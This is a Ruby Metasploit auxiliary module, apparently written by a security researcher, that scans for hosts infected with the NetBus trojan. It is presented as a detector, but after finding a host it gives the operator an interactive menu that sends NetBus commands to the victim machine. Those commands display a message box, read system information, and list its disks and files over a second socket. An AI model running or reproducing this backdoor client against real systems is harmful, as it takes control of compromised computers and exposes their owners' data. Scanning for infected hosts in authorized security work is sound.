##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Netbus Detector',
      'Description' => 'Detect Netbus Trojan',
      'References'  =>
        [
          [ 'URL', 'https://github.com/pablogonzalezpe/' ],
        ],
      'Author'      => [ 'Pablo <pablo[at]flu-project.com>' ],
      'License'     => MSF_LICENSE
    )

    register_options(
    [
      Opt::RPORT(6000),
    ], self.class)
  end
	
  def showMenu
	print_status "Menu Netbus Detector"
	puts "================================"
	puts
	puts "0) Message box"
	puts "1) Get Info"
	puts "2) Files"
	puts "s) Exit"
	puts
  end
  
  def message(sock)
	sock.write "Message;0;Surprise!;Information;64;\r"
	respuesta = sock.gets(19)
	r = sock.gets("\r")
	puts
	puts (respuesta+r).gsub!(";","\n")
	puts
  end

  def getInfo(sock)
	sock.write "GetInfo\r"
	r = sock.gets("\r")
	r.gsub!(";","\n")
	r.gsub!("|","\n")
	puts
	puts r
	puts
  end

  def files(sock,target_host)
	sock.write("GetDisks\r")
	disk = sock.gets("\r");
	tam = disk.split(";")[1]
	puts disk
	sock2 = TCPSocket.open(target_host,12346)
	list = sock2.gets(tam)
	puts
	puts list
	puts
	sock2.close
  end

  def run_host(target_host)
    begin

        connect

        resp = sock.get_once(-1, 13)

        print_good "Found! ip:#{target_host} #{resp}"

	begin
		showMenu
		print "Option:"
		option = gets.chomp
		
		case option
                	when "0" then message(sock)
                	when "1" then getInfo(sock)
                	when "2" then files(sock,target_host)
                	when "s" then puts "\nBye Bye!"
                	when "S" then puts "\nBye Bye!"
                else print_error "Really?? Ouch!"
        	end
        	puts "ENTER..."
        	gets

	end while ((not option =="s")&&(not option == "S"))  	

        disconnect
      end

    end
end
